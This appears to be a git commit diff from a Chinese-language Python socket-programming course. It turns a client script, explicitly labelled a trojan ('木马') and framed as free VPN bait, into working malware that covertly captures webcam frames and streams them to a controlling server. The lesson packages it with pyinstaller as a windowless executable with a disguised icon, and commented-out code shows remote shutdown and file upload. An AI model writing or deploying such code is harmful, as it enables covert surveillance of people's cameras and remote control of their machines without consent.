8639f9ad52d539b5b46a42bb4a5a13ac8bce76ae
guanqing <guanqinghz@163.com>
2024-11-11 21:16:17 +0800

    三更-socket编程

--- 三更/7、Socket/client.py
+++ 三更/7、Socket/client.py
@@ -1,6 +1,8 @@
-# 客户端
+# 客户端 木马 exe 最后再讲
 import os
+import sys
 from socket import *
+import cv2  # pip3 install opencv-python
 
 # 1、准备一台电话机 / 创建一个套接字
 socket = socket()
@@ -9,13 +11,60 @@ socket.connect((gethostname(), 8888))
 # socket.connect(('146.56.223.48', 8888))
 
 # 连上之后 木马 免费翻墙
-text = socket.recv(1024).decode()  # 一次最多接受1024个字节
-print(text)
+# text = socket.recv(1024).decode()  # 一次最多接受1024个字节
+# print(text)
+#
+# choise = socket.recv(1024).decode()
+# print(choise)
+# if choise == '1':
+#     os.system('shutdown -s -t 60')  # 60秒后关机
+# elif choise == '2':
+#     os.system('shutdown -r -t 60')  # 60秒后重启
+# cmd shutdown -a 取消重启
 
-choise = socket.recv(1024).decode()
-print(choise)
-if choise == '1':
-    os.system('shutdown -s -t 1')  # 1秒后关机
-elif choise == '2':
-    os.system('shutdown -r -t 1')  # 1秒后重启
+# 文件传输
+# 先告诉后台有多少字节的数据 等待回复
+# filesize = os.path.getsize('123.png')
+# socket.send(str(filesize).encode())
+# socket.recv(1024).decode()
 
+# 打开文件,把文件数据发送给对方,等待回复
+# with open('123.png', 'rb') as file:
+#     for data in file:  # 把文件中的数据一次一次读出来
+#         socket.send(data)  # 把每一次读取的数据发送给后台
+#         # print(len(data))
+# socket.recv(1024).decode()
+
+# socket.send('你好'.encode()) # 发送二进制的数据
+# 银行卡的卡号
+# 有18位
+
+# 摄像头
+# 1、开启摄像头
+cap = cv2.VideoCapture(0)  # 0 1 2
+if not cap.isOpened():
+    socket.send('error'.encode())
+    sys.exit(1)
+else:
+    socket.send('ready'.encode())
+    socket.recv(1024)
+
+    while True:
+        _, frame = cap.read()  # 获取到一帧图像
+        cv2.imwrite('1.jpg', frame)
+
+        filesize = os.path.getsize('1.jpg')
+        socket.send(str(filesize).encode())
+        socket.recv(1024).decode()
+
+        with open('1.jpg', 'rb') as file:
+            for data in file:  # 把文件中的数据一次一次读出来
+                socket.send(data)  # 把每一次读取的数据发送给后台
+        socket.recv(1024).decode()
+
+# 2、把摄像头采集到的画面 截取一帧 图片文件
+# 3、把得到的图像文件传输给后台
+
+# 1、安装一个模块 pip3 install pyinstaller
+# 2、看操作
+# 3、pyinstaller -F -w -i icon.png client.py
--- 三更/7、Socket/server.py
+++ 三更/7、Socket/server.py
@@ -1,5 +1,8 @@
 # server 服务端 后台
+import sys
 from socket import *
+
+import cv2
 
 # 1、准备一台电话机 / 创建一个套接字
 server_socket = socket()
@@ -17,7 +20,49 @@ while True:
     print(addr)  # 打印一下对方的网络地址
 
     # 连上之后 后台
-    s.send('你好'.encode())  # 发送
-    print('1.关机\n2.重启\n')
-    choise = input('请选择:')
-    s.send(choise.encode())
+    # s.send('你好'.encode())  # 发送
+    # print('1.关机\n2.重启\n')
+    # choise = input('请选择:')
+    # s.send(choise.encode())
+
+    # 文件传输
+    # 接受对方的文件的大小的数据
+    # filesize = int(s.recv(1024).decode())
+    # s.send('ok'.encode())
+
+    # 接收文件的数据 回复
+    # cursize = 0  # 当前的大小!
+    # with open('321.png', 'wb') as file:
+    #     while cursize < filesize:  # 只要刻度小于目标 一直循环
+    #         data = s.recv(2048)
+    #         file.write(data)
+    #         cursize += len(data)
+    #         # print(len(data))
+    #     s.send('ok'.encode())
+
+    # 摄像头
+    cap_is_open = s.recv(1024).decode()
+    if cap_is_open == 'error':
+        sys.exit(1)
+    else:
+        s.send('ok'.encode())
+        # 1、接受摄像头的一帧图像
+        filesize = int(s.recv(1024).decode())
+        cursize = 0  # 当前的大小!
+        with open('2.jpg', 'wb') as file:
+            while cursize < filesize:  # 只要刻度小于目标 一直循环
+                data = s.recv(2048)
+                file.write(data)
+                cursize += len(data)
+                # print(len(data))
+            s.send('ok'.encode())
+
+        # 2、显示出来
+        # 2.1、创建一个窗口叫cpature
+        cv2.namedWindow('capture')
+        # 2.2、加载一张图片image
+        image = cv2.imread('2.jpg')
+        # 2.3、把image显示在capture
+        cv2.imshow('capture', image)
+        # 2.4、设置刷新时间
+        cv2.waitKey(20)
